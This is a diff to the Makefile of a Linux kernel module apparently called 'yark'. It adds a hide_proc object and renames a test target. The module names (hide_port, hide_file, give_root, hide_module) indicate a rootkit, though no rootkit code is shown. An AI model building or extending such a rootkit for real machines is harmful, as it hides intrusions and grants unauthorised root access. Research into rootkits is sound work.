@@ -1,6 +1,6 @@
 MODULE = yark
 obj-m += $(MODULE).o
-$(MODULE)-objs := main.o yhook.o command.o hide_port.o hide_file.o give_root.o hide_module.o
+$(MODULE)-objs := main.o yhook.o command.o hide_port.o hide_file.o give_root.o hide_module.o hide_proc.o
 
 all:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
@@ -14,7 +14,7 @@ install: all
 uninstall:
 	sudo rmmod $(MODULE).ko
 
-test:
+test_port:
 	sudo dmesg -C
 	sudo insmod $(MODULE).ko
 	sudo netstat -antp
